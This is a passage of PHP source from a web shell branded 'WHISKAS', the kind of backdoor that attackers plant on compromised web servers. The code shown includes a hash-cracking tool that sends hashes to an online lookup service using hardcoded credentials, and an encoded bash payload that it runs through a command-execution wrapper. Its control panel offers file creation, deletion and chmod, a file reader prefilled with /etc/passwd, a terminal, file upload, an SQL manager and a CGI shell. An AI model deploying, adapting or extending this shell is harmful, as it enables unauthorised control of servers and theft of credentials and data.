			if(isset($json["copyright"]) && !empty($json["copyright"])){
				$data["copyright"] = $json["copyright"];
			}
			if(isset($json["solevisible"]) && !empty($json["solevisible"])){
				$data["solevisible"] = $json["solevisible"];
			}
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				$data["code_name"] = $json["code_name"];
				$data["version_number"] = __WHISKAS_VERSION__;
			}
			if(isset($json["market"]) && !empty($json["market"])){
				$data["market"] = $json["market"];
			}
			echo @json_encode($data);
		}
	}
}
function WHISKASWriteTocgiapi($name, $source){
	return ""; // disabled - no folder creation
}
function WHISKAScheckcgi(){if(strlen(WHISKASEx("id",false,true,true))>0)echo("ok");else echo("no");}
function WHISKASupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
		$tmp_path = WHISKASWriteTocgiapi("getheader.WHISKAS",$bash);
		$data = WHISKASEx("cd '{$tmp_path}/WHISKAScgiapi';sh getheader.WHISKAS",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__WHISKAS_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
			echo $data;
		}
	}else{
		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
	}
}
function __alert($s){
echo '<center>'.__pre().$s.'</center>';
}
function create_table($data){
echo '<table border="1">';
foreach ($data as $key => $val){
$array = array();
foreach($val as $k => $v){
$array[$k] = $v;
}
echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type='text' id='".$array['id']."' name='".$array['inputName']."' ".($array['placeholder']?'placeholder':'value')."='".$array['inputValue']."' size='".$array['inputSize']."' ".($array['disabled']?'disabled':'')."></td></tr>";
}
echo '</table>';
}
function WHISKAScpcrack(){
WHISKAShead();
echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
if($_POST['WHISKAS1']=='dec'){
$algorithms = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
<form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
foreach($algorithms as $key=>$val){echo('<option value="'.$key.'">'.$val.'</option>');}
echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['WHISKAS3'] == '>>'){
$hash = $_POST['WHISKAS2'];
if(!empty($hash)){
$hash_type = $_POST['WHISKAS4'];
$email = "WHISKASkwww@gmail.com";
$code = "7b9fa79f92c3cd96";
$target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
$resp = @file_get_contents($target);
if($resp==''){
$get = new WHISKASCURL();
$resp = $get->Send($target);
}
echo __pre().'<center>';
switch($resp){
	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
}
if(substr($resp,0,4)!='CODE'&&$resp!=''){
echo "<b>Result: <font color='green'>".$resp."</font></b>";
}elseif(substr($resp,0,4)!='CODE'){
echo "<font color='red'>NoT Found</font><br />";
}
echo('</center>');
}
}
}
if($_POST['WHISKAS1']=='analyzer'){
echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
<form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
<div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['WHISKAS3'] == '>>'){
$hash = $_POST['WHISKAS2'];
if(!empty($hash)){
$curl = new WHISKASCURL();
$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
echo(__pre().'<center>');
if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
	echo('<font color="green">'.$s[1].'</font>');
}else{
	echo('<font color="red">Not Found...!</font>');
}
echo('</center><br>');
}
}
}
echo '</div>';
WHISKASfooter();
}
function WHISKASfooter(){
if(!isset($_POST['ajax'])){
echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
<tr>
<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Chm0d : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='WHISKASOpenPhpTerminal();return false;' class='foottable WHISKAS_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE2LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9IjQ3MS4zNjJweCIgaGVpZ2h0PSI0NzEuMzYycHgiIHZpZXdCb3g9IjAgMCA0NzEuMzYyIDQ3MS4zNjIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDQ3MS4zNjIgNDcxLjM2MjsiIGZpbGw9IiMyNGZmMDMiDQoJIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPGc+DQoJPGc+DQoJCTxwYXRoIGQ9Ik00NjguNzk0LDM1NS4xNzFjLTEuNzA3LTEuNzE4LTMuODk3LTIuNTctNi41NjMtMi41N0gxODguMTQ1Yy0yLjY2NCwwLTQuODU0LDAuODUzLTYuNTY3LDIuNTcNCgkJCWMtMS43MTEsMS43MTEtMi41NjUsMy44OTctMi41NjUsNi41NjN2MTguMjc0YzAsMi42NjIsMC44NTQsNC44NTMsMi41NjUsNi41NjNjMS43MTMsMS43MTIsMy45MDMsMi41Nyw2LjU2NywyLjU3aDI3NC4wODYNCgkJCWMyLjY2NiwwLDQuODU2LTAuODU4LDYuNTYzLTIuNTdjMS43MTEtMS43MTEsMi41NjctMy45MDEsMi41NjctNi41NjN2LTE4LjI3NEM0NzEuMzY1LDM1OS4wNjgsNDcwLjUxMywzNTYuODgyLDQ2OC43OTQsMzU1LjE3MXoiDQoJCQkvPg0KCQk8cGF0aCBkPSJNMzAuMjU5LDg1LjA3NWMtMS45MDMtMS45MDMtNC4wOTMtMi44NTYtNi41NjctMi44NTZzLTQuNjYxLDAuOTUzLTYuNTYzLDIuODU2TDIuODUyLDk5LjM1Mw0KCQkJQzAuOTUsMTAxLjI1NSwwLDEwMy40NDIsMCwxMDUuOTE4YzAsMi40NzgsMC45NSw0LjY2NCwyLjg1Miw2LjU2N0wxMTUuMDYsMjI0LjY5TDIuODUyLDMzNi44OTZDMC45NSwzMzguNzk5LDAsMzQwLjk4OSwwLDM0My40Ng0KCQkJYzAsMi40NzgsMC45NSw0LjY2NSwyLjg1Miw2LjU2N2wxNC4yNzYsMTQuMjczYzEuOTAzLDEuOTA2LDQuMDg5LDIuODU0LDYuNTYzLDIuODU0czQuNjY1LTAuOTUxLDYuNTY3LTIuODU0bDEzMy4wNDgtMTMzLjA0NQ0KCQkJYzEuOTAzLTEuOTAyLDIuODUzLTQuMDk2LDIuODUzLTYuNTdjMC0yLjQ3My0wLjk1LTQuNjYzLTIuODUzLTYuNTY1TDMwLjI1OSw4NS4wNzV6Ii8+DQoJPC9nPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPC9zdmc+DQo='>Terminal</button><br></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
<input type='hidden' name='a' value='FilesMAn'>
<input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
<input type='hidden' name='ajax' value='true'>
<input type='hidden' name='WHISKAS1' value='uploadFile'>
<input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;&#128193; Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='WHISKAS-copyright'><span class='copyright'>[ Designed By Whiskas &copy; 2025-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='' style='color:rgb(255 255 255);text-decoration: none;'>Let's Connect!</a></span> <span style='letter-spacing: 2px;color: #ffffff;'></span> <span><a style='color: #25ff00;text-decoration: none;' target='_blank' href='https://t.me/kvnzlx8'>Whiskas</a></span></div></td>
</tr>
</table>
</div>

<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div><div onClick='editorClose(\"options_window\");' class='close-button'>X</div></div></div><div style='height:100%;' class='content_options_holder'><div class='options_tab'></div><div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div></div></div></div>

<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'>Sql Manager</div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div><div onClick='editorClose(\"database_window\");' class='close-button'>X</div></div></div><div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'><div class='sql-tabs'></div><div class='sql-contents' style='max-height: 85vh;'></div></div></div></div>

<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'>X</div></div></div><div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'><div class='terminal-tabs'></div><div style='height:90%;' class='terminal-contents'></div></div></div></div>
<div id='editor' style='display:none;'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'>X</div></div></div><div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'><div class='editor-tabs'></div><div class='editor-content-holder'></div></div></div></div></div></div>
<div id='update-content'></div>
<div id='database_window-minimized' onclick='showEditor(\"database_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div class='minimized-text' style='top: 15px;'>Database</div></div></div>
<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>
<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 12px;' class='minimized-text'>Cgi Shell</div></div></div>
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"https://storage.dk-only.site/shell-assest/dk-profile.png\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIKCSB3aWR0aD0iNDY1Ljk1MXB4IiBoZWlnaHQ9IjQ2NS45NTFweCIgdmlld0JveD0iMCAwIDQ2NS45NTEgNDY1Ljk1MSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNDY1Ljk1MSA0NjUuOTUxOyIgZmlsbD0id2hpdGUiCgkgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPHBhdGggZD0iTTQ0MS45NjIsMjg0LjM2NGwtNTkuMzg5LTU5LjM4M2MtMTUuOTg0LTE1Ljk4NS0zNS4zOTYtMjMuOTgyLTU4LjIzOC0yMy45ODJjLTIzLjIyMywwLTQzLjAxMyw4LjM3NS01OS4zODUsMjUuMTI1CgkJbC0yNS4xMjUtMjUuMTI1YzE2Ljc1MS0xNi4zNjgsMjUuMTI1LTM2LjI1NiwyNS4xMjUtNTkuNjcxYzAtMjIuODQxLTcuODk4LTQyLjE1Ny0yMy42OTgtNTcuOTU4bC01OC44MTUtNTkuMDk3CgkJYy0xNS43OTgtMTYuMTc4LTM1LjIxMi0yNC4yNy01OC4yNDItMjQuMjdjLTIyLjg0MSwwLTQyLjE2LDcuOTAyLTU3Ljk1OCwyMy43TDI0LjI2Nyw2NS4zODZDOC4wODgsODEuMTg4LDAsMTAwLjUwNCwwLDEyMy4zNDMKCQljMCwyMi44NDEsNy45OTYsNDIuMjU4LDIzLjk4Miw1OC4yNDVsNTkuMzg1LDU5LjM4M2MxNS45OSwxNS45ODgsMzUuNDA0LDIzLjk4Miw1OC4yNDUsMjMuOTgyCgkJYzIzLjIxOSwwLDQzLjAxNS04LjM3NCw1OS4zODMtMjUuMTI2bDI1LjEyNSwyNS4xMjZjLTE2Ljc1LDE2LjM3MS0yNS4xMjUsMzYuMjU4LTI1LjEyNSw1OS42NzIKCQljMCwyMi44NDMsNy44OTgsNDIuMTU0LDIzLjY5Nyw1Ny45NThsNTguODIsNTkuMDk0YzE1LjgwMSwxNi4xNzcsMzUuMjA4LDI0LjI3LDU4LjIzOCwyNC4yN2MyMi44NDQsMCw0Mi4xNTQtNy44OTcsNTcuOTU4LTIzLjY5OAoJCWw0MS45NzMtNDEuNjgyYzE2LjE3Ny0xNS44MDQsMjQuMjcxLTM1LjExOCwyNC4yNzEtNTcuOTU4QzQ2NS45NDcsMzE5Ljc3MSw0NTcuOTUzLDMwMC4zNTksNDQxLjk2MiwyODQuMzY0eiBNMjAwLjk5OSwxNjIuMTc4CgkJYy0wLjU3MS0wLjU3MS0yLjMzNC0yLjM3OC01LjI4LTUuNDI0Yy0yLjk0OC0zLjA0Ni00Ljk5NS01LjA5Mi02LjEzNi02LjE0Yy0xLjE0My0xLjA0Ny0yLjk1Mi0yLjQ3NC01LjQyNi00LjI4NgoJCWMtMi40NzgtMS44MDktNC45MDItMy4wNDQtNy4yOC0zLjcxMWMtMi4zOC0wLjY2Ni00Ljk5OC0wLjk5OC03Ljg1NC0wLjk5OGMtNy42MTEsMC0xNC4wODQsMi42NjYtMTkuNDE0LDcuOTkzCgkJYy01LjMzLDUuMzI3LTcuOTkyLDExLjc5OS03Ljk5MiwxOS40MTRjMCwyLjg1MywwLjMzMiw1LjQ3MSwwLjk5OCw3Ljg1MWMwLjY2NiwyLjM4MiwxLjkwMyw0LjgwOCwzLjcxMSw3LjI4MQoJCWMxLjgwOSwyLjQ3NCwzLjIzNyw0LjI4Myw0LjI4Myw1LjQyNmMxLjA0NCwxLjE0MSwzLjA5LDMuMTg4LDYuMTM2LDYuMTM5YzMuMDQ2LDIuOTUsNC44NTMsNC43MDksNS40MjQsNS4yODEKCQljLTUuNzExLDUuODk4LTEyLjU2Myw4Ljg0OC0yMC41NTUsOC44NDhjLTcuODA0LDAtMTQuMjc3LTIuNTY4LTE5LjQxNC03LjcwNUw2Mi44MSwxNDIuNzYxYy01LjMyNy01LjMzLTcuOTkyLTExLjgwMi03Ljk5Mi0xOS40MTcKCQljMC03LjQyMSwyLjY2Mi0xMy43OTYsNy45OTItMTkuMTI2bDQxLjk3MS00MS42ODdjNS41MjMtNS4xNCwxMS45OTEtNy43MDUsMTkuNDE3LTcuNzA1YzcuNjExLDAsMTQuMDgzLDIuNjYzLDE5LjQxNCw3Ljk5MwoJCWw1OC44MTMsNTkuMDk3YzUuMzMsNS4zMyw3Ljk5MiwxMS44MDEsNy45OTIsMTkuNDE0QzIxMC40MTgsMTQ5LjMyMSwyMDcuMjc4LDE1Ni4yNywyMDAuOTk5LDE2Mi4xNzh6IE00MDMuMTQ3LDM2MS43MzIKCQlsLTQxLjk3Myw0MS42ODZjLTUuMzMyLDQuOTQ1LTExLjgsNy40MjMtMTkuNDE4LDcuNDIzYy03LjgwOSwwLTE0LjI3LTIuNTY2LTE5LjQxLTcuNzA3bC01OC44MTMtNTkuMTAxCgkJYy01LjMzMS01LjMzMi03Ljk5LTExLjgtNy45OS0xOS40MWMwLTcuOTk0LDMuMTM4LTE0Ljk0MSw5LjQyMS0yMC44NDFjMC41NzUsMC41NjcsMi4zMzQsMi4zODEsNS4yODQsNS40MgoJCWMyLjk1LDMuMDQ2LDQuOTk2LDUuMDkzLDYuMTQsNi4xNGMxLjE0MywxLjA1MSwyLjk0OSwyLjQ3OCw1LjQyLDQuMjg4YzIuNDc4LDEuODExLDQuOSwzLjA0OSw3LjI4MiwzLjcxMwoJCWMyLjM4MiwwLjY2Nyw0Ljk5NywwLjk5OSw3Ljg1MSwwLjk5OWM3LjYxOCwwLDE0LjA4Ni0yLjY2NSwxOS40MTgtNy45OTRjNS4zMjQtNS4zMjgsNy45OTQtMTEuOCw3Ljk5NC0xOS40MQoJCWMwLTIuODU0LTAuMzM5LTUuNDcyLTEtNy44NTFjLTAuNjctMi4zODItMS45MDItNC44MDktMy43Mi03LjI4MmMtMS44MTEtMi40NzEtMy4yMy00LjI4NC00LjI4MS01LjQyOAoJCWMtMS4wNDctMS4xMzYtMy4wOTQtMy4xODMtNi4xMzktNi4xNGMtMy4wNDYtMi45NDktNC44NTMtNC43MDktNS40MjgtNS4yNzZjNS43MTUtNi4wOTIsMTIuNTY2LTkuMTM4LDIwLjU1NC05LjEzOAoJCWM3LjYxNywwLDE0LjA4NSwyLjY2MywxOS40MSw3Ljk5NGw1OS4zODgsNTkuMzgyYzUuMzMyLDUuMzMyLDcuOTk1LDExLjgwNyw3Ljk5NSwxOS40MTcKCQlDNDExLjEzMiwzNTAuMDMyLDQwOC40NjksMzU2LjQxNSw0MDMuMTQ3LDM2MS43MzJ6Ii8+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPC9zdmc+\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIKCSB3aWR0aD0iNDc1LjA3OHB4IiBoZWlnaHQ9IjQ3NS4wNzdweCIgdmlld0JveD0iMCAwIDQ3NS4wNzggNDc1LjA3NyIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNDc1LjA3OCA0NzUuMDc3OyIgZmlsbD0id2hpdGUiCgkgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPGc+CgkJPHBhdGggZD0iTTQ2Ny4wODMsMzE4LjYyN2MtNS4zMjQtNS4zMjgtMTEuOC03Ljk5NC0xOS40MS03Ljk5NEgzMTUuMTk1bC0zOC44MjgsMzguODI3Yy0xMS4wNCwxMC42NTctMjMuOTgyLDE1Ljk4OC0zOC44MjgsMTUuOTg4CgkJCWMtMTQuODQzLDAtMjcuNzg5LTUuMzI0LTM4LjgyOC0xNS45ODhsLTM4LjU0My0zOC44MjdIMjcuNDA4Yy03LjYxMiwwLTE0LjA4MywyLjY2OS0xOS40MTQsNy45OTQKCQkJQzIuNjY0LDMyMy45NTUsMCwzMzAuNDI3LDAsMzM4LjA0NHY5MS4zNThjMCw3LjYxNCwyLjY2NCwxNC4wODUsNy45OTQsMTkuNDE0YzUuMzMsNS4zMjgsMTEuODAxLDcuOTksMTkuNDE0LDcuOTloNDIwLjI2NgoJCQljNy42MSwwLDE0LjA4Ni0yLjY2MiwxOS40MS03Ljk5YzUuMzMyLTUuMzI5LDcuOTk0LTExLjgsNy45OTQtMTkuNDE0di05MS4zNThDNDc1LjA3OCwzMzAuNDI3LDQ3Mi40MTYsMzIzLjk1NSw0NjcuMDgzLDMxOC42Mjd6CgkJCSBNMzYwLjAyNSw0MTQuODQxYy0zLjYyMSwzLjYxNy03LjkwNSw1LjQyNC0xMi44NTQsNS40MjRzLTkuMjI3LTEuODA3LTEyLjg0Ny01LjQyNGMtMy42MTQtMy42MTctNS40MjEtNy44OTgtNS40MjEtMTIuODQ0CgkJCWMwLTQuOTQ4LDEuODA3LTkuMjM2LDUuNDIxLTEyLjg0N2MzLjYyLTMuNjIsNy44OTgtNS40MzEsMTIuODQ3LTUuNDMxczkuMjMyLDEuODExLDEyLjg1NCw1LjQzMQoJCQljMy42MTMsMy42MSw1LjQyMSw3Ljg5OCw1LjQyMSwxMi44NDdDMzY1LjQ0Niw0MDYuOTQyLDM2My42MzgsNDExLjIyNCwzNjAuMDI1LDQxNC44NDF6IE00MzMuMTA5LDQxNC44NDEKCQkJYy0zLjYxNCwzLjYxNy03Ljg5OCw1LjQyNC0xMi44NDgsNS40MjRjLTQuOTQ4LDAtOS4yMjktMS44MDctMTIuODQ3LTUuNDI0Yy0zLjYxMy0zLjYxNy01LjQyLTcuODk4LTUuNDItMTIuODQ0CgkJCWMwLTQuOTQ4LDEuODA3LTkuMjM2LDUuNDItMTIuODQ3YzMuNjE3LTMuNjIsNy44OTgtNS40MzEsMTIuODQ3LTUuNDMxYzQuOTQ5LDAsOS4yMzMsMS44MTEsMTIuODQ4LDUuNDMxCgkJCWMzLjYxNywzLjYxLDUuNDI3LDcuODk4LDUuNDI3LDEyLjg0N0M0MzguNTM2LDQwNi45NDIsNDM2LjcyOSw0MTEuMjI0LDQzMy4xMDksNDE0Ljg0MXoiLz4KCQk8cGF0aCBkPSJNMjI0LjY5MiwzMjMuNDc5YzMuNDI4LDMuNjEzLDcuNzEsNS40MjEsMTIuODQ3LDUuNDIxYzUuMTQxLDAsOS40MTgtMS44MDgsMTIuODQ3LTUuNDIxbDEyNy45MDctMTI3LjkwOAoJCQljNS44OTktNS41MTksNy4yMzQtMTIuMTgyLDMuOTk3LTE5Ljk4NmMtMy4yMy03LjQyMS04Ljg0Ny0xMS4xMzItMTYuODQ0LTExLjEzNmgtNzMuMDkxVjM2LjU0M2MwLTQuOTQ4LTEuODExLTkuMjMxLTUuNDIxLTEyLjg0NwoJCQljLTMuNjItMy42MTctNy45MDEtNS40MjYtMTIuODQ3LTUuNDI2aC03My4wOTZjLTQuOTQ2LDAtOS4yMjksMS44MDktMTIuODQ3LDUuNDI2Yy0zLjYxNSwzLjYxNi01LjQyNCw3Ljg5OC01LjQyNCwxMi44NDdWMTY0LjQ1CgkJCWgtNzMuMDg5Yy03Ljk5OCwwLTEzLjYxLDMuNzE1LTE2Ljg0NiwxMS4xMzZjLTMuMjM0LDcuODAxLTEuOTAzLDE0LjQ2NywzLjk5OSwxOS45ODZMMjI0LjY5MiwzMjMuNDc5eiIvPgoJPC9nPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+Cjwvc